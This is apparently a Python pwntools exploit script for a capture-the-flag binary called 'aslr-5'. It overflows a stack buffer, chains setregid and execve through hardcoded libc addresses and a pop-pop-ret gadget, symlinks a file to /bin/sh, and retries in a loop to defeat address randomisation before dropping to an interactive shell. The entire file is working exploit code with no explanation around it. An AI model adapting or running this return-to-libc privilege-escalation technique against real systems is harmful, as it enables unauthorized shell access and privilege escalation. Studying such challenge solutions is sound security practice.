#!/usr/bin/env python

from pwn import *
import os
i=0
while (i<50):
    p = process("./aslr-5")

    buf = "A" * 0x88 + "BBBB"
    i=i+1
    print(i)


    execve = p32(0xb7eb87e0)
    setregid = p32(0xb7ee75f0)
    pop_pop_ret = p32(0x080485ba)

    buf += setregid
    buf += pop_pop_ret
    buf += p32(50411)
    buf += p32(50411)

    string = p32(0x8048670)

    if os.path.exists("\a"):
            os.unlink("\a")

    os.symlink("/bin/sh","\a");

    buf += execve
    buf += p32(0)
    buf += string
    buf += p32(0)
    buf += p32(0)

    p.sendline(buf)
    #p.sendline("cat flag;"*10)
    #check = p.recvline()
    #if 'cand' in check:
    #    break
    p.interactive()
    p.close()

